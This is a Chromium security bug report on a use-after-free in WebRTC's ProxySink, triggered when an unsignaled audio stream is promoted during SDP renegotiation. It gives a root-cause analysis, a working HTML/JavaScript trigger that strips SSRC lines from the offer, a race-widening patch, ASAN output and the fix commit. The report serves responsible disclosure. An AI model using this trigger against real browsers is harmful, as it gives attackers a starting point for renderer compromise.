# Use-after-free in WebRTC ProxySink via unsignaled-to-signaled stream promotion leads to renderer compromise

| Field | Value |
|-------|-------|
| **Issue ID** | [486421954](https://issues.chromium.org/issues/486421954) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2026-02-22 |
| **Bounty** | $11,000.00 |

## Description

## Title

Use-after-free in WebRTC ProxySink via unsignaled-to-signaled stream promotion leads to renderer compromise

## Summary

A use-after-free vulnerability exists in the WebRTC voice engine's audio sink management. When an unsignaled receive stream is promoted to a signaled stream during SDP renegotiation, the `ProxySink` object attached to the stream retains a raw pointer to the `default_sink_` backing object. Because the promotion clears `unsignaled_recv_ssrcs_`, the subsequent call to `SetDefaultRawAudioSink(nullptr)` skips cleaning up the ProxySink and directly destroys the backing object. The audio output thread then dereferences the dangling pointer through `ProxySink::OnData()`, resulting in a heap-use-after-free. An attacker who controls the SDP offer content during a WebRTC session can trigger this from JavaScript, achieving arbitrary code execution in the renderer process.

## Bisect

Introducing Commit: `4904fb6f462e08da5b8ad7492781929fa5c0780c`

- Date: 2017-02-17
- Author: [solenberg@webrtc.org](mailto:solenberg@webrtc.org)
- Review: <https://codereview.webrtc.org/2685573003>

## Root Cause

The WebRTC voice engine uses a `ProxySink` wrapper class to forward audio data from a receive stream to the current default audio sink. This proxy is created inside `SetDefaultRawAudioSink` and attached to the most recent unsignaled receive stream. The proxy stores a raw pointer to the underlying `AudioSinkInterface` object (which is a `RemoteAudioSource::AudioDataProxy` instance owned by `default_sink_`):

```
// third_party/webrtc/media/engine/webrtc_voice_engine.cc
class ProxySink : public AudioSinkInterface {
 public:
  explicit ProxySink(AudioSinkInterface* sink) : sink_(sink) {
    RTC_DCHECK(sink);
  }

  void OnData(const Data& audio) override {
    sink_->OnData(audio);  // Dereferences raw pointer — UAF when sink_ is dangling
  }

 private:
  AudioSinkInterface* sink_;  // Raw pointer, not raw_ptr<>
};

```

The `SetDefaultRawAudioSink` method only updates the ProxySink on a stream when `unsignaled_recv_ssrcs_` is non-empty. If the vector is empty, it skips the ProxySink update entirely and proceeds to replace `default_sink_`, which destroys the previous backing object:

```
// third_party/webrtc/media/engine/webrtc_voice_engine.cc
void WebRtcVoiceReceiveChannel::SetDefaultRawAudioSink(
    std::unique_ptr<AudioSinkInterface> sink) {
  RTC_DCHECK_RUN_ON(worker_thread_);
  if (!unsignaled_recv_ssrcs_.empty()) {
    std::unique_ptr<AudioSinkInterface> proxy_sink(
        sink ? new ProxySink(sink.get()) : nullptr);
    SetRawAudioSink(unsignaled_recv_ssrcs_.back(), std::move(proxy_sink));
  }
  // When unsignaled_recv_ssrcs_ is empty, the ProxySink on the promoted stream
  // is NOT updated, but default_sink_ is destroyed here:
  default_sink_ = std::move(sink);
}

```

The vulnerability is triggered through the unsignaled-to-signaled stream promotion path. When `AddRecvStream` is called for an SSRC that already exists as an unsignaled stream, it calls `MaybeDeregisterUnsignaledRecvStream`, which removes the SSRC from `unsignaled_recv_ssrcs_` and returns true. The stream object itself is kept alive (promoted), and the ProxySink attached to it is left untouched:

```
// third_party/webrtc/media/engine/webrtc_voice_engine.cc
// Inside AddRecvStream:
  if (MaybeDeregisterUnsignaledRecvStream(ssrc)) {
    // SSRC removed from unsignaled_recv_ssrcs_, but ProxySink still on the stream
    auto stream_ids = sp.stream_ids();
    std::string sync_group = stream_ids.empty() ? std::string() : stream_ids[0];
    call_->OnUpdateSyncGroup(recv_streams_[ssrc]->stream(),
                             std::move(sync_group));
    return true;  // Stream promoted — ProxySink with raw pointer survives
  }

```
```
// third_party/webrtc/media/engine/webrtc_voice_engine.cc
bool WebRtcVoiceReceiveChannel::MaybeDeregisterUnsignaledRecvStream(
    uint32_t ssrc) {
  RTC_DCHECK_RUN_ON(worker_thread_);
  auto it = absl::c_find(unsignaled_recv_ssrcs_, ssrc);
  if (it != unsignaled_recv_ssrcs_.end()) {
    unsignaled_recv_ssrcs_.erase(it);  // Vector becomes empty
    return true;
  }
  return false;
}

```

After the promotion, the SDP processing layer calls `GetRestartFunctionForMediaChannel_w` in `AudioRtpReceiver`, which transitions the receiver from unsignaled (ssrc = nullopt) to signaled (ssrc = N). This first calls `Stop(nullopt)`, which invokes `SetDefaultRawAudioSink(nullptr)`, then calls `Start(ssrc)`, which attaches a new `AudioDataProxy` via `SetRawAudioSink`:

```
// third_party/webrtc/pc/audio_rtp_receiver.cc
void AudioRtpReceiver::GetRestartFunctionForMediaChannel_w(
    std::optional<uint32_t> ssrc,
    bool track_enabled,
    MediaSourceInterface::SourceState state) {
  // ...
  if (state != MediaSourceInterface::kInitializing) {
    if (signaled_ssrc_ == ssrc)
      return;
    source_->Stop(media_channel_, signaled_ssrc_);  // signaled_ssrc_ is nullopt
    // Stop(nullopt) → SetDefaultRawAudioSink(nullptr) → DESTROYS default_sink_
    // But ProxySink on the promoted stream still holds a raw pointer to the now-freed object
  }

  signaled_ssrc_ = std::move(ssrc);
  source_->Start(media_channel_, signaled_ssrc_);  // Start(ssrc) → SetRawAudioSink(ssrc, new AudioDataProxy)
  // Between Stop and Start, the audio output thread may call ProxySink::OnData()
  // which dereferences the dangling sink_ pointer — UAF
  // ...
}

```

The `RemoteAudioSource::Stop` and `Start` methods delegate to the voice channel:

```
// third_party/webrtc/pc/remote_audio_source.cc
void RemoteAudioSource::Stop(VoiceMediaReceiveChannelInterface* media_channel,
                             std::optional<uint32_t> ssrc) {
  RTC_DCHECK_RUN_ON(worker_thread_);
  RTC_DCHECK(media_channel);
  ssrc ? media_channel->SetRawAudioSink(*ssrc, nullptr)
       : media_channel->SetDefaultRawAudioSink(nullptr);  // ssrc is nullopt → destroys default_sink_
}

```

The cross-thread race occurs because all of the above logic runs on the WebRTC worker thread, while the audio output thread continuously calls `ChannelReceive::GetAudioFrameWithInfo`, which acquires a mutex and calls through the `audio_sink_` pointer. The `audio_sink_` pointer in `ChannelReceive` points to the ProxySink, and the mutex protects only this outer pointer, not the inner `sink_` raw pointer that ProxySink holds. Between the moment `SetDefaultRawAudioSink(nullptr)` destroys `default_sink_` and the moment `SetRawAudioSink(ssrc, new_sink)` replaces the ProxySink, any audio callback through `ProxySink::OnData()` dereferences the freed `AudioDataProxy` object.

The ASAN output confirms the object is "NOT PROTECTED" by MiraclePtr because `ProxySink::sink_` is a plain `AudioSinkInterface*` rather than `raw_ptr<AudioSinkInterface>`.

## Reproduce

To trigger the vulnerability, the attacker controls the SDP offer content during a WebRTC peer connection. In the first negotiation round, the offer is munged to remove all `a=ssrc:`, `a=ssrc-group:`, and `a=msid:` lines, which causes the receiver to process the incoming audio as an unsignaled stream while keeping `remote_streams_` empty in `BaseChannel`. When audio RTP packets arrive, `MaybeCreateDefaultReceiveStream` creates an unsignaled receive stream with a ProxySink. In the second negotiation round, the offer includes the full SSRC information. Because `remote_streams_` was empty from the first round, `UpdateRemoteStreams_w` does not call `ResetUnsignaledRecvStream`. Instead, `AddRecvStream` hits the promote path, clearing `unsignaled_recv_ssrcs_` without cleaning up ProxySink, and then `GetRestartFunctionForMediaChannel_w` destroys `default_sink_` while ProxySink still references it.

Save the following as `poc.html`:

```
<!DOCTYPE html>
<html>
<head><title>ProxySink UAF PoC</title></head>
<body>
<pre id="log"></pre>
<script>
function log(msg) {
    const el = document.getElementById('log');
    el.textContent += new Date().toISOString().slice(11,23) + ' ' + msg + '\n';
    console.log(msg);
}

function stripStreamsFromSdp(sdp) {
    // Remove a=ssrc:, a=ssrc-group:, AND a=msid: lines.
    // This makes MediaContentDescription::streams() return EMPTY,
    // which means remote_streams_ stays empty in BaseChannel.
    // Key: empty remote_streams_ prevents ResetUnsignaledRecvStream from being called
    // on the next renegotiation, allowing the promote path to be hit.
    return sdp.replace(/a=ssrc:[^\r\n]*\r?\n/g, '')
              .replace(/a=ssrc-group:[^\r\n]*\r?\n/g, '')
              .replace(/a=msid:[^\r\n]*\r?\n/g, '');
}

async function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function run() {
    log('[*] PoC: ProxySink dangling default_sink_ pointer');

    const config = {iceServers: []};
    const pc1 = new RTCPeerConnection(config); // sender
    const pc2 = new RTCPeerConnection(config); // receiver (target)

    pc1.onicecandidate = e => {
        if (e.candidate) pc2.addIceCandidate(e.candidate).catch(() => {});
    };
    pc2.onicecandidate = e => {
        if (e.candidate) pc1.addIceCandidate(e.candidate).catch(() => {});
    };

    pc2.ontrack = e => {
        log('[+] pc2 received track: ' + e.track.kind);
        // Attach to audio element to force audio rendering pipeline
        const audio = document.createElement('audio');
        audio.srcObject = e.streams[0] || new MediaStream([e.track]);
        audio.autoplay = true;
        audio.volume = 0.01; // low volume
        audio.play().catch(() => {});
    };

    log('[*] Getting audio track...');
    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({audio: true});
    } catch(e) {
        log('[!] getUserMedia failed, creating synthetic audio...');
        const ctx = new AudioContext();
        const osc = ctx.createOscillator();
        osc.frequency.value = 440;
        const dest = ctx.createMediaStreamDestination();
        osc.connect(dest);
        osc.start();
        stream = dest.stream;
    }

    const audioTrack = stream.getAudioTracks()[0];
    pc1.addTrack(audioTrack, stream);
    log('[*] Added audio track to pc1');

    // Phase 1: Negotiate with NO streams info (empty remote_streams_)
    // Remove a=ssrc AND a=msid so that streams() is empty.
    // This way remote_streams_ stays empty, preventing ResetUnsignaledRecvStream.
    // But the transceiver is still created (m-line exists) and goes to unsignaled mode.
    log('[*] Phase 1: Creating offer (strip all stream info)...');
    let offer1 = await pc1.createOffer();

    const ssrcMatch = offer1.sdp.match(/a=ssrc:(\d+)/);
    if (ssrcMatch) {
        log('[*] Original offer SSRC: ' + ssrcMatch[1]);
    }

    await pc1.setLocalDescription(offer1);

    // Strip both a=ssrc AND a=msid so streams() is empty
    const strippedSdp = stripStreamsFromSdp(offer1.sdp);
    log('[*] Stripped offer SDP (no a=ssrc, no a=msid) for pc2');
    log('[*] This keeps remote_streams_ empty, avoiding ResetUnsignaledRecvStream');

    await pc2.setRemoteDescription({type: 'offer', sdp: strippedSdp});

    let answer1 = await pc2.createAnswer();
    await pc2.setLocalDescription(answer1);
    await pc1.setRemoteDescription(answer1);

    log('[*] Phase 1 negotiation complete. Waiting for audio RTP to flow...');

    // Wait for connection + RTP to trigger MaybeCreateDefaultReceiveStream
    await new Promise(resolve => {
        let resolved = false;
        pc2.onconnectionstatechange = () => {
            log('[*] pc2 connection state: ' + pc2.connectionState);
            if (pc2.connectionState === 'connected' && !resolved) {
                resolved = true;
                setTimeout(resolve, 2000);
            }
        };
        setTimeout(() => { if (!resolved) { resolved = true; resolve(); } }, 10000);
    });

    log('[*] Audio flowing. Unsignaled recv stream created, ProxySink wrapping default_sink_.');

    // Phase 2: Renegotiate WITH SSRC (trigger promote then UAF)
    // UpdateRemoteStreams_w:
    //   remote_streams_ is EMPTY (no old streams to check, ResetUnsignaledRecvStream NOT called)
    //   New stream has SSRC X, AddRecvStream(X), MaybeDeregisterUnsignaledRecvStream, PROMOTE
    //     (removes X from unsignaled_recv_ssrcs_, but ProxySink stays on stream)
    //
    // Then GetRestartFunctionForMediaChannel_w(X):
    //   Stop(nullopt) calls SetDefaultRawAudioSink(nullptr)
    //     unsignaled_recv_ssrcs_ empty, skip ProxySink cleanup, DESTROY default_sink_
    //   (race window: audio thread calls ProxySink::OnData on freed object)
    //   Start(X) calls SetRawAudioSink(X, new AudioDataProxy) which replaces ProxySink

    log('[!] Phase 2: Renegotiating WITH SSRC to trigger promote...');

    let offer2 = await pc1.createOffer();
    log('[*] New offer SSRC: ' + (offer2.sdp.match(/a=ssrc:(\d+)/) || ['','none'])[1]);

    await pc1.setLocalDescription(offer2);

    log('[!] Setting remote description with SSRC - triggering promote + UAF window...');
    await pc2.setRemoteDescription(offer2);

    let answer2 = await pc2.createAnswer();
    await pc2.setLocalDescription(answer2);
    await pc1.setRemoteDescription(answer2);

    log('[*] Phase 2 complete. If ASAN did not fire, waiting for audio callbacks...');
    await sleep(3000);

    log('[*] PoC complete. Check stderr for ASAN output.');
}

run().catch(e => log('[ERROR] ' + e.message + '\n' + e.stack));
</script>
</body>
</html>

```

Because this is a cross-thread race condition, the vulnerable window between `default_sink_` destruction and ProxySink replacement is only a few instructions wide on the worker thread. To reliably reproduce the crash under ASAN, apply the following patch to widen the race window by inserting a 500ms sleep after `default_sink_` is destroyed while `unsignaled_recv_ssrcs_` is empty (the exact condition where ProxySink is left dangling):

```
diff --git a/third_party/webrtc/media/engine/webrtc_voice_engine.cc b/third_party/webrtc/media/engine/webrtc_voice_engine.cc
--- a/third_party/webrtc/media/engine/webrtc_voice_engine.cc
+++ b/third_party/webrtc/media/engine/webrtc_voice_engine.cc
@@ -88,6 +88,7 @@
 #include "rtc_base/checks.h"
 #include "rtc_base/dscp.h"
+#include "rtc_base/thread.h"
 #include "rtc_base/experiments/struct_parameters_parser.h"
 #include "rtc_base/logging.h"
 #include "rtc_base/network/sent_packet.h"
@@ -2850,6 +2851,12 @@ void WebRtcVoiceReceiveChannel::SetDefaultRawAudioSink(
     SetRawAudioSink(unsignaled_recv_ssrcs_.back(), std::move(proxy_sink));
   }
   default_sink_ = std::move(sink);
+  // Widen the race window for reproduction: after default_sink_ is destroyed
+  // (sink was nullptr), the ProxySink on the promoted stream still holds a
+  // dangling pointer. Sleep to let the audio thread hit ProxySink::OnData().
+  if (!default_sink_ && unsignaled_recv_ssrcs_.empty()) {
+    Thread::SleepMs(500);
+  }
 }

```

Build Chromium with ASAN, apply the patch, and run:

```
cd ~/chromium/src
git apply wrtc077_reproduce.patch
autoninja -C out/asan-release chrome
ASAN_OPTIONS=detect_odr_violation=0 xvfb-run -a \
  out/asan-release/chrome \
  --no-sandbox --disable-gpu \
  --use-fake-device-for-media-stream \
  --use-fake-ui-for-media-stream \
  --autoplay-policy=no-user-gesture-required \
  --enable-logging=stderr \
  --user-data-dir=$(mktemp -d) \
  poc.html

```

ASAN output:

```
==1804752==ERROR: AddressSanitizer: heap-use-after-free on address 0x7b6a44d42e30 at pc 0x7f4aaa0ceee2 bp 0x7b4981cd7400 sp 0x7b4981cd73f8
READ of size 8 at 0x7b6a44d42e30 thread T17 (AudioOutputDevi)
    #0 0x7f4aaa0ceee1 in webrtc::(anonymous namespace)::ProxySink::OnData(webrtc::AudioSinkInterface::Data const&) third_party/webrtc/media/engine/webrtc_voice_engine.cc:138:12
    #1 0x7f4aaa98dc91 in webrtc::voe::(anonymous namespace)::ChannelReceive::GetAudioFrameWithInfo(int, webrtc::AudioFrame*) third_party/webrtc/audio/channel_receive.cc:440:20
    #2 0x7f4aaab90554 in webrtc::AudioMixerImpl::GetAudioFromSources(int) third_party/webrtc/modules/audio_mixer/audio_mixer_impl.cc:137:42
    #3 0x7f4aaab9015e in webrtc::AudioMixerImpl::Mix(unsigned long, webrtc::AudioFrame*) third_party/webrtc/modules/audio_mixer/audio_mixer_impl.cc:107:27
    #4 0x7f4aaa985bea in webrtc::AudioTransportImpl::PullRenderData(int, int, unsigned long, unsigned long, void*, long*, long*) third_party/webrtc/audio/audio_transport_impl.cc:273:11
    #5 0x7f4a5b72e2a1 in blink::WebRtcAudioDeviceImpl::RenderData(media::AudioBus*, int, base::TimeDelta, base::TimeDelta*, media::AudioGlitchInfo const&) third_party/blink/renderer/modules/webrtc/webrtc_audio_device_impl.cc:117:30
    #6 0x7f4a5b7402da in blink::WebRtcAudioRenderer::SourceCallback(int, media::AudioBus*) third_party/blink/renderer/modules/webrtc/webrtc_audio_renderer.cc:647:12
    #7 0x7f4a5b73fbc1 in blink::WebRtcAudioRenderer::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) third_party/blink/renderer/modules/webrtc/webrtc_audio_renderer.cc:601:5
    #8 0x7f4aadf424f2 in media::AudioOutputDeviceThreadCallback::Process(unsigned int) media/audio/audio_output_device_thread_callback.cc:107:21
    #9 0x7f4aadf0377b in media::AudioDeviceThread::ThreadMain() media/audio/audio_device_thread.cc:114:18
    #10 0x7f4ac42dde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #11 0x556bcf638316 in asan_thread_start(void*) asan_interceptors.cpp

0x7b6a44d42e30 is located 0 bytes inside of 16-byte region [0x7b6a44d42e30,0x7b6a44d42e40)
freed by thread T10 (WebRTC_W_and_N) here:
    #0 0x556bcf674dd2 in operator delete(void*, unsigned long) (/home/test/chromium/src/out/asan-release/chrome+0x6825dd2) (BuildId: 02e60c0f598a1e35)
    #1 0x7f4aaa69566e in webrtc::RemoteAudioSource::AudioDataProxy::~AudioDataProxy() third_party/webrtc/pc/remote_audio_source.cc:47:30
    #2 0x7f4aaa0c6ba7 in webrtc::WebRtcVoiceReceiveChannel::SetDefaultRawAudioSink(std::__Cr::unique_ptr<webrtc::AudioSinkInterface, std::__Cr::default_delete<webrtc::AudioSinkInterface>>) gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #3 0x7f4aaa68a835 in webrtc::AudioRtpReceiver::GetRestartFunctionForMediaChannel_w(std::__Cr::optional<unsigned int>, bool, webrtc::MediaSourceInterface::SourceState) third_party/webrtc/pc/audio_rtp_receiver.cc:233:14
    #4 0x7f4aaa80c0e5 in void webrtc::FunctionView<void ()>::CallVoidPtr<webrtc::(anonymous namespace)::ScopedOperationsBatcher::Run()::'lambda'()>(webrtc::FunctionView<void ()>::VoidUnion) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #5 0x7f4a5ba458e4 in webrtc::ThreadWrapper::ProcessPendingSends() third_party/webrtc/api/function_view.h:96:12
    #6 0x7f4a5ba48284 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #7 0x7f4ac4160c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #8 0x7f4ac41e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #9 0x7f4ac41e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #10 0x7f4ac40033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #11 0x7f4ac41e37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #12 0x7f4ac40cb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #13 0x7f4ac4279832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #14 0x7f4ac4279e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #15 0x7f4ac42dde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #16 0x556bcf638316 in asan_thread_start(void*) asan_interceptors.cpp

previously allocated by thread T10 (WebRTC_W_and_N) here:
    #0 0x556bcf6741cd in operator new(unsigned long) (/home/test/chromium/src/out/asan-release/chrome+0x68251cd) (BuildId: 02e60c0f598a1e35)
    #1 0x7f4aaa6933fd in webrtc::RemoteAudioSource::Start(webrtc::VoiceMediaReceiveChannelInterface*, std::__Cr::optional<unsigned int>) gen/third_party/libc++/src/include/__memory/unique_ptr.h:756:26
    #2 0x7f4aaa68a8b8 in webrtc::AudioRtpReceiver::GetRestartFunctionForMediaChannel_w(std::__Cr::optional<unsigned int>, bool, webrtc::MediaSourceInterface::SourceState) third_party/webrtc/pc/audio_rtp_receiver.cc:237:12
    #3 0x7f4aaa80c0e5 in void webrtc::FunctionView<void ()>::CallVoidPtr<webrtc::(anonymous namespace)::ScopedOperationsBatcher::Run()::'lambda'()>(webrtc::FunctionView<void ()>::VoidUnion) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #4 0x7f4a5ba458e4 in webrtc::ThreadWrapper::ProcessPendingSends() third_party/webrtc/api/function_view.h:96:12
    #5 0x7f4a5ba48284 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #6 0x7f4ac4160c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #7 0x7f4ac41e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #8 0x7f4ac41e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #9 0x7f4ac40033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #10 0x7f4ac41e37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #11 0x7f4ac40cb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #12 0x7f4ac4279832 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #13 0x7f4ac4279e02 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #14 0x7f4ac42dde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #15 0x556bcf638316 in asan_thread_start(void*) asan_interceptors.cpp

Thread T17 (AudioOutputDevi) created by T5 (Chrome_ChildIOT) here:
    #0 0x556bcf61e0d1 in pthread_create (/home/test/chromium/src/out/asan-release/chrome+0x67cf0d1) (BuildId: 02e60c0f598a1e35)
    #1 0x7f4ac42dd54c in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) base/threading/platform_thread_posix.cc:153:13
    #2 0x7f4aadf02e51 in media::AudioDeviceThread::AudioDeviceThread(media::AudioDeviceThread::Callback*, base::ScopedGeneric<int, base::internal::ScopedFDCloseTraits>, char const*, base::ThreadType) media/audio/audio_device_thread.cc:66:9

Thread T10 (WebRTC_W_and_N) created by T0 (chrome) here:
    #0 0x556bcf61e0d1 in pthread_create (/home/test/chromium/src/out/asan-release/chrome+0x67cf0d1) (BuildId: 02e60c0f598a1e35)
    #1 0x7f4ac42dd54c in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) base/threading/platform_thread_posix.cc:153:13
    #2 0x7f4ac42783b0 in base::Thread::StartWithOptions(base::Thread::Options) base/threading/thread.cc:228:26
    #3 0x7f4a5aca9671 in blink::PeerConnectionDependencyFactory::CreatePeerConnectionFactory() third_party/blink/renderer/modules/peerconnection/peer_connection_dependency_factory.cc:436:29

SUMMARY: AddressSanitizer: heap-use-after-free third_party/webrtc/media/engine/webrtc_voice_engine.cc:138:12 in webrtc::(anonymous namespace)::ProxySink::OnData(webrtc::AudioSinkInterface::Data const&)
Shadow bytes around the buggy address:
  0x7b6a44d42b80: f7 fa 00 fa f7 fa 00 fa f7 fa 00 fa f7 fa 00 fa
  0x7b6a44d42c00: f7 fa 00 fa f7 fa 00 fa f7 fa 00 fa f7 fa 00 fa
  0x7b6a44d42c80: f7 fa 00 fa f7 fa 00 fa f7 fa fd fa f7 fa fd fa
  0x7b6a44d42d00: f7 fa fd fa f7 fa 00 fa f7 fa fd fa f7 fa fd fa
  0x7b6a44d42d80: f7 fa 00 00 f7 fa 00 00 f7 fa fd fa f7 fa fd fa
=>0x7b6a44d42e00: f7 fa fd fd f7 fa[fd]fd f7 fa fd fa f7 fa fd fa
  0x7b6a44d42e80: f7 fa fd fa f7 fa fd fa f7 fa 00 00 f7 fa fd fd
  0x7b6a44d42f00: f7 fa fd fa f7 fa fd fd f7 fa fd fd f7 fa fd fa
  0x7b6a44d42f80: f7 fa fd fa f7 fa fd fa f7 fa fd fa f7 fa fd fa
  0x7b6a44d43000: f7 fa fd fd f7 fa 03 fa f7 fa fd fa f7 fa fd fa
  0x7b6a44d43080: f7 fa fd fa f7 fa fd fa f7 fa fd fa f7 fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==1804752==ADDITIONAL INFO

==1804752==Note: Please include this section with the ASan report.
Task trace:


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==1804752==END OF ADDITIONAL INFO

```
## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4541251390996480.

### 24...@project.gserviceaccount.com (2026-02-23)

ClusterFuzz testcase 4541251390996480 appears to be flaky, updating reproducibility hotlist.

### 24...@project.gserviceaccount.com (2026-02-23)

Detailed Report: https://clusterfuzz.com/testcase?key=4541251390996480

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x770b093b3db0
Crash State:
  webrtc::ProxySink::OnData
  webrtc::voe::ChannelReceive::GetAudioFrameWithInfo
  webrtc::AudioMixerImpl::GetAudioFromSources
  
Sanitizer: address (ASAN)

Recommended Security Severity: Critical

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=1588708

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4541251390996480

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### an...@chromium.org (2026-02-23)

tommi, hta can either of you PTAL? thanks!

### ch...@google.com (2026-02-24)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-24)

Setting Priority to P0 to match Severity s0. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### dx...@google.com (2026-03-06)

Project: src  

Branch:  main  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/454040>

Update raw audio sink management for unsignaled streams

---


Expand for full commit details
```
     
    Ensure the default raw audio sink is correctly detached when an 
    unsignaled stream is removed or promoted. Previously, when a stream 
    was deregistered, the associated ProxySink could retain a bad 
    pointer to the default sink. 
     
    This change modifies the VoiceEngine to: 
    * Explicitly clear the raw audio sink from a stream when it is 
      removed from the unsignaled stream list. 
    * Properly hand over the default sink to the next available 
      unsignaled stream if the current primary stream is deregistered. 
    * Simplify the logic for detaching the sink from the previous latest 
      stream when a new unsignaled stream is identified. 
     
    Bug: chromium:486421954 
    Fixes: chromium:486421954 
    Change-Id: Ied7062e95a1749a9d8f95f77ec2b0dc81ab00ad1 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454040 
    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Commit-Position: refs/heads/main@{#47074}

```

---

Files:

- M `media/engine/webrtc_voice_engine.cc`
- M `media/engine/webrtc_voice_engine_unittest.cc`

---

Hash: af411f52472297833af0813b727c7b4644221f04  

Date: Thu Mar 5 22:12:04 2026


---

### dx...@google.com (2026-03-06)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7643151>

Roll WebRTC from 0bcd472228e6 to 7f5a8b656cf6 (2 revisions)

---


Expand for full commit details
```
     
    https://webrtc.googlesource.com/src.git/+log/0bcd472228e6..7f5a8b656cf6 
     
    2026-03-06 devicentepena@webrtc.org Propagate delay estimator fields to AecState. 
    2026-03-06 tommi@webrtc.org Update raw audio sink management for unsignaled streams 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/webrtc-chromium-autoroll 
    Please CC webrtc-chromium-sheriffs-robots@google.com,webrtc-infra@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in WebRTC: https://bugs.chromium.org/p/webrtc/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
